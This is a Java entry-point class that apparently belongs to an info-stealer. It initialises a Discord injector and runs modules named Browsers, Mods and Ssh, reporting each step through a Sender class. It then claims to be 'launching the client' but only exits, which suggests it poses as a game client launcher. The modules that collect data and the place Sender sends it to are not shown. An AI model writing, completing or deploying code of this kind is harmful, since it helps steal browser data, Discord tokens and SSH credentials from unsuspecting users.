package io.github.luxotick;

import io.github.luxotick.impl.Browsers;
import io.github.luxotick.impl.DiscordInjector;
import io.github.luxotick.impl.Mods;
import io.github.luxotick.impl.Ssh;

public class Start {
	public static void main(String[] argument) throws Exception {
		if (DiscordInjector.instance == null){
			DiscordInjector.instance = new DiscordInjector();
		}
		DiscordInjector.instance.initialize();
		Sender.sendMessage("Starting...");
		Browsers.main(argument);
		Sender.sendMessage("Browsers done.");
		Mods.main(argument);
		Sender.sendMessage("Mods done.");
		Ssh.main(argument);
		Sender.sendMessage("Ssh done.");
		Sender.sendMessage("Now launching the client.");
		System.exit(0);
	}
	
}